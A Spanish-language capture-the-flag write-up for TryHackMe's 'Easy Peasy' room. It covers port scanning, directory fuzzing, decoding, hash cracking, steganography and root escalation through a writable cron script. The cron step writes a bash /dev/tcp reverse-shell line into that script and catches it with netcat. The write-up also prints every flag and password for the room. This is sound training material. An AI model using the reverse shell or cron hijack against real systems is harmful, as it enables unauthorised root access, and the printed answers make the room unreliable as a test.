# Easy Peasy — TryHackMe

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![Status](https://img.shields.io/badge/Status-Completed-blue?style=flat)

> **Fecha:** 28/04/2026  
> **Autor:** [Josue Rendón](https://github.com/Slasho01)  
> **Room:** [Easy Peasy](https://tryhackme.com/room/easypeasyctf)

---

## 📋 Descripción

Room de dificultad fácil que cubre enumeración de puertos no estándar, fuzzing de directorios web, decodificación de múltiples encodings (base64, base62, binario), crackeo de hashes con wordlist personalizada, esteganografía y escalada de privilegios mediante cron job escribible.

---

## 🎯 Objetivos

* Flag 1 — directorio oculto en nginx
* Flag 2 — robots.txt en Apache
* Flag 3 — hash crackeado con wordlist personalizada
* Flag de usuario
* Flag de root

---

## 🔍 1. Reconocimiento

### Escaneo completo de puertos

```bash
nmap -p- --min-rate 5000 10.64.142.175
```

```
PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown
```

**R: 3 puertos abiertos**

### Detección de versiones

```bash
nmap -sC -sV 10.64.142.175
```

```
80/tcp open  http  nginx 1.16.1
```

**R: nginx 1.16.1**

### Puerto más alto

```bash
nmap -sC -sV -p 65524 10.64.142.175
```

```
65524/tcp open  http  Apache httpd 2.4.43 ((Ubuntu))
```

**R: Apache**

### Puerto 6498 (unknown)

```bash
nmap -sC -sV -p 6498 10.64.142.175
```

```
6498/tcp open  ssh  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
```

SSH corriendo en puerto no estándar.

---

## 🌐 2. Enumeración Web

### Nginx — Puerto 80

```bash
gobuster dir -u http://10.64.142.175 -w /usr/share/wordlists/dirb/common.txt
```

```
/hidden    (Status: 301)
/robots.txt (Status: 200)
```

Fuzzeamos dentro de `/hidden`:

```bash
gobuster dir -u http://10.64.142.175/hidden -w /usr/share/wordlists/dirb/common.txt
```

```
/whatever  (Status: 301)
```

Revisamos el código fuente de `/hidden/whatever/`:

```html
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
```

Decodificamos base64:

```bash
echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
```

**🚩 Flag 1: `flag{f1rs7_fl4g}`**

---

### Apache — Puerto 65524

```bash
gobuster dir -u http://10.64.142.175:65524/ -w /usr/share/wordlists/dirb/common.txt
```

```
/robots.txt  (Status: 200)
```

Revisamos `robots.txt`:

```
User-Agent:*
Disallow:/
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

El `User-Agent` es un hash MD5 — lo desencriptamos en CrackStation y obtenemos la flag.

**🚩 Flag 2: `flag{1m_s3c0nd_fl4g}`**

### Directorio oculto en base62

Revisamos el código fuente de `http://10.64.142.175:65524/`:

```html
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

Decodificamos `ObsJmP173N2X6dOrAgEAL0Vu` con base62 en CyberChef y obtenemos:

```
/n0th1ng3ls3m4tt3r
```

**R: `/n0th1ng3ls3m4tt3r`**

---

## 🔓 3. Crackeo de hash — Flag 3

Accedemos a `http://10.64.142.175:65524/n0th1ng3ls3m4tt3r/` y encontramos:

```
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

Es un hash **GOST**. Usamos la wordlist proporcionada por la room:

```bash
echo "940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81" > hash.txt
john hash.txt --wordlist=easypeasy_1596838725703.txt --format=gost
```

```
mypasswordforthatjob
```

**🚩 Flag 3 / R: `mypasswordforthatjob`**

---

## 🖼️ 4. Esteganografía — Credenciales SSH

Descargamos la imagen del directorio oculto:

```bash
wget http://10.64.142.175:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
```

Extraemos datos ocultos con la contraseña crackeada:

```bash
steghide extract -sf binarycodepixabay.jpg
# passphrase: mypasswordforthatjob
```

Leemos el archivo extraído:

```bash
cat secrettext.txt
```

```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101
01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111
01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

Decodificamos el binario en CyberChef (From Binary) y obtenemos:

```
iconvertedmypasswordtobinary
```

**Credenciales:** `boring:iconvertedmypasswordtobinary`

---

## 💥 5. Acceso SSH

```bash
ssh boring@10.64.142.175 -p 6498
```

```
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt
synt{a0jvgf33zfa0ez4y}
```

La flag está rotada con **ROT13** — decodificamos:

**🚩 Flag usuario: `flag{n0wits33msn0rm4l}`**

---

## ⬆️ 6. Escalada de privilegios — Cron Job Hijacking

```bash
sudo -l
# Sorry, user boring may not run sudo on kral4-PC.

find / -perm -4000 -type f 2>/dev/null
# Sin binarios SUID explotables

cat /etc/crontab
```

```
* * * * *  root  cd /var/www/ && sudo bash .mysecretcronjob.sh
```

Hay un cron job ejecutado como root cada minuto. Revisamos el script:

```bash
cat /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root
```

El script está vacío y es escribible. Inyectamos una reverse shell:

```bash
echo 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1' > /var/www/.mysecretcronjob.sh
```

Ponemos el listener:

```bash
nc -lvnp 4444
```

Tras 1 minuto recibimos la conexión como root:

```
Connection received on 10.64.142.175 58378
root@kral4-PC:/var/www#
```

---

## 🚩 7. Flag de root

```bash
cat /root/.root.txt
```

```
flag{63a9f0ea7bb98050796b649e85481845}
```

---

## 📝 8. Lecciones aprendidas

* Siempre escanear **todos los puertos** con `-p-` — SSH estaba en el puerto 6498, no en el 22
* Los directorios ocultos pueden tener **múltiples capas** — `/hidden` → `/whatever`
* Los hashes no siempre son SHA256 — identificar correctamente el formato (`hash-identifier`, `hashid`) antes de crackear
* El **binario** y el **ROT13** son encodings clásicos en CTF — tenerlos siempre en mente
* Un **cron job que ejecuta un script escribible** como root es escalada directa de privilegios

---

## 🔗 Referencias

* [GTFOBins](https://gtfobins.github.io/)
* [CyberChef](https://gchq.github.io/CyberChef/)
* [CrackStation](https://crackstation.net/)
* [HackTricks — Cron Jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-scripts-called-by-root)

---

*Write-up por [Josue Rendón](https://github.com/Slasho01) · [TryHackMe Profile](https://tryhackme.com/p/Slasho)*
